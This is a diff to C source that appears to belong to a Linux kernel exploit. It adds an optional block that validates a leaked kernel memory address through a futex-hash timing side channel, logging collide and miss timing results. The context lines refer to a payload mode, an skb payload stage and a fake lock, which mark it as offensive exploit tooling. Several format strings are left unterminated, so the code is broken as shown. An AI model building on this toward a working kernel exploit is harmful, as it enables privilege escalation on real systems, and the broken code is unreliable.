@@ -820,6 +820,47 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
     return 0;
   }
 
+  /* ---- OVAL: zero-trust oracle validation of the solved mm ---- */
+  if (env_int_range("GL_OVAL", 0, 0, 1)) {
+    size_t T = (size_t)&ks->inc_futex[128];
+    uint32_t bT = futex_hash(T, leaked);
+    size_t agree = 0, disagree = 0, tested_c = 0, tested_m = 0;
+    pr_info("[OVAL] mm=%016zx modelBucket(T)=%u\n, leaked, bT);
+    __increase(ks, 128, APPENDED_FUTEXES);
+    for (size_t i = 2; i < ks->total_futexes; ++i) {
+      size_t id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+      if (id >= FUTEX_SZ) break;
+      size_t c = (size_t)&ks->futexes[id];
+      int pred = (futex_hash(c, leaked) == bT);
+      if (pred && tested_c >= 4) continue;
+      if (!pred && tested_m >= 4) continue;
+      if (!pred && tested_c < 4) continue; /* collide-side first (fast) */
+      size_t tA = __measure_raw(c);
+      __decrease(ks, 128);
+      size_t tB = __measure_raw(c);
+      int oracle = (tA > 3 * tB + 8);
+      if (pred) {
+        tested_c++;
+        pr_info("[OVAL] pred=COLLIDE addr=%zx tA=%zu tB=%zu oracle=%d\n,
+                c, tA, tB, oracle);
+        if (oracle) agree++; else disagree++;
+      } else {
+        tested_m++;
+        pr_info("[OVAL] pred=MISS    addr=%zx tA=%zu tB=%zu oracle=%d\n,
+                c, tA, tB, oracle);
+        if (!oracle) agree++; else disagree++;
+      }
+      if (disagree) break; /* model broken - stop early */
+      __increase(ks, 128, APPENDED_FUTEXES);
+    }
+    pr_info("[OVAL] RESULT agree=%zu disagree=%zu (collide=%zu miss=%zu)\n,
+            agree, disagree, tested_c, tested_m);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    cleanup_page_prepare_state();
+    return 0;
+  }
+
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   pr_info("[probe] base=%016zx payload_mode=%d entering skb payload", base, payload_mode);
   /* v36: fake_lock = round-th tile (round persists across reboots) */
